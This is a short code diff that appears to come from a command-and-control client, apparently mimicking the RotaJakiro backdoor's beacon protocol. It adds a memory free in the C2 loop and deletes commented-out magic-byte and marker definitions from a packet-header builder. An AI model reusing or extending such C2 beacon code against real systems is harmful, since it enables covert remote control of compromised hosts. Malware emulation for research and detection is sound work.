@@ -145,6 +145,7 @@ void c2_loop(){
     sleep(sleepy_time);
     }
 
+    free(initial_pkt);
     close(sock);
 }
 
@@ -237,25 +238,12 @@ char *initial_rota_pkt() {
     char *rotaHdr = (char *)malloc(82);
     memset(rotaHdr, 0, 82);
 
-    //char magicBytes[] = {0x3B, 0x91, 0x01, 0x10};
     memcpy(rotaHdr, magicBytes, sizeof(magicBytes));
-
-    ///char payloadLen[] = {0x0f};
     memcpy(&rotaHdr[4], payloadLen, sizeof(payloadLen));
-
-    //char marker_1[] = {0xe9, 0xbb, 0x91};
     memcpy(&rotaHdr[19], marker_1, sizeof(marker_1));
-
-    //char marker_2[] = {0xe5, 0xae, 0xa2};
     memcpy(&rotaHdr[24], marker_2, sizeof(marker_2));
-
-    //char cmd_id[] = {0x13, 0x37};
     memcpy(&rotaHdr[27], cmd_id, sizeof(cmd_id));
-
-    //char marker_3[] = {0xe9, 0xbb, 0x91};
     memcpy(&rotaHdr[66], marker_3, sizeof(marker_3));
-
-    //char marker_4[] = {0x39,0x00};
     memcpy(&rotaHdr[77], marker_4, sizeof(marker_4));
 
     return rotaHdr;
